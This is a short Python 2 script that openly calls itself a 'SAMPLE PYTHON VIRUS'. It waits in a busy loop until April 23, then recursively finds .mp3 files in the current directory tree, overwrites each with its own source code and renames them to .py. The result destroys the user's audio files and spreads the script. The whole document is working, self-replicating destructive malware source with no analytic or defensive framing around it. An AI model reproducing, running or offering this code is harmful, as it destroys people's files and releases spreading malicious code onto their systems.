#!/usr/bin/python
import os
import datetime
SIGNATURE = "SAMPLE PYTHON VIRUS"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-4:] == ".mp3":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect

def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname,"w")
        f.write(virusstring)
        f.close()
        portion = os.path.splitext(fname)
        newname = portion[0] + ".py"
        os.rename(fname,newname)
  
def trigger():
    if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 23:
        print "YOU ARE INFECTED!!"
        return False
    else:
        return True   

# wait to trigger the condition
while trigger():
    continue

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
